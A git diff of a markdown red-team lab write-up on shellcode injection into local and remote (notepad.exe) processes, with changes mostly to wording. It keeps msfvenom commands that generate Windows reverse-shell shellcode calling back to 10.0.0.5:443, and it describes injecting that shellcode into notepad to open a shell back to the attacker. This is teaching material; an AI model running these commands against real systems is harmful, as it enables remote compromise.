@@ -8,7 +8,7 @@ This lab explores some classic ways of injecting shellcode into a process memory
 
 ## Executing Shellcode in Local Process
 
-First of - a test how to execute shellcode directly from a C program.
+First of - a simple test of how to execute the shellcode directly from a C++ program.
 
 Generating shellcode for a reverse shell:
 
@@ -18,7 +18,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f c -b \x00\
 
 ![](../../.gitbook/assets/inject-shellcode.png)
 
-C++ code to invoke the shellcode:
+C++ code to injectd and invoke the shellcode:
 
 {% code-tabs %}
 {% code-tabs-item title="inject-local-process.cpp" %}
@@ -74,11 +74,11 @@ int main()
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
-Before compiling, let's have a look at the binary in a disassembler - just to get a rough idea of how our C++ code gets translated into machine code for x64:
+Before compiling, for the sake of curiosity, let's have a look at the generated shellcode binary in a disassembler so we can get a rough idea of how our C++ code gets translated into machine code for x64:
 
 ![](../../.gitbook/assets/inject-ida.png)
 
-For a x32 binary, the shellcode \(msfvenom -p windows/shell\_reverse\_tcp LHOST=10.0.0.5 LPORT=443 -f c -b \x00\x0a\x0d\) is located in main thread's stack:
+Also for the sake of curiosity, I wanted to see how the injected shellcode looks in the injected process and to see where it actually is. With a 32-bit shellcode binary \(msfvenom -p windows/shell\_reverse\_tcp LHOST=10.0.0.5 LPORT=443 -f c -b \x00\x0a\x0d\), the shellcode is nicely located in the main thread's stack:
 
 ![](../../.gitbook/assets/inject-shellcode-location.png)
 
@@ -89,6 +89,8 @@ Back to the x64 bit shellcode - compiling and executing the binary gives us the 
 ![](../../.gitbook/assets/inject-reverse-shell.png)
 
 ## Executing Shellcode in Remote Process
+
+The below code will inject the shellcode into a notepad.exe process with PID 5428 which will initiate a reverse shell back to the attacker:
 
 {% code-tabs %}
 {% code-tabs-item title="inject-remote-process.cpp" %}
@@ -153,15 +155,15 @@ int main(int argc, char *argv[])
 
 {% file src="../../.gitbook/assets/inject1 \(1\).exe" caption="Inject shellcode to Remote Process w/ CreateRemoteThread" %}
 
-The above code will inject the shellcode into a notepad.exe process with PID 5428. Below shows notepad has not initiated any TCP connections yet:
+Below shows notepad before shellcode injection - it has not initiated any TCP connections yet:
 
 ![](../../.gitbook/assets/inject-notepad-not-injected.png)
 
-Once the code is compiled and executed, monitoring the API calls taking place on the system, it can be seen that notepad is doing something it should not ever - spawning a cmd.exe and initiating a TCP connection:
+Once the code is compiled and executed, monitoring the API calls taking place on the system reveals that notepad is doing something it should not ever be doing - spawning a cmd.exe and initiating a TCP connection:
 
 ![](../../.gitbook/assets/inject-api-monitoring.png)
 
-Checking the notepad again, the results are different this time:
+Checking the notepad in ProcExplorer again reveals an established TCP connection with a cmd.exe as a child:
 
 ![](../../.gitbook/assets/inject-notepad-injected.png)
 
